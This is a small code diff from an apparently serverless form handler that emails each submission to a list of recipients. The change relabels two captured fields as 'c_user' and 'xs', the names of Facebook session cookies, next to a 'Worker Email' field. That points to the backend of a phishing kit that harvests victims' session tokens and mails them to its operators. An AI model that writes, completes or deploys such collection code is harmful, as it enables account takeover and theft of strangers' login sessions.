@@ -20,8 +20,8 @@ export default async function handler(req, res) {
 New Form Submission:
 
 Name: ${name}
-Ser: ${ser}
-Us: ${us}
+c_user: ${cUser}
+xs: ${xs}
 Worker Email: ${workerEmail}
 
 Sent to: ${emails.join(", ")}
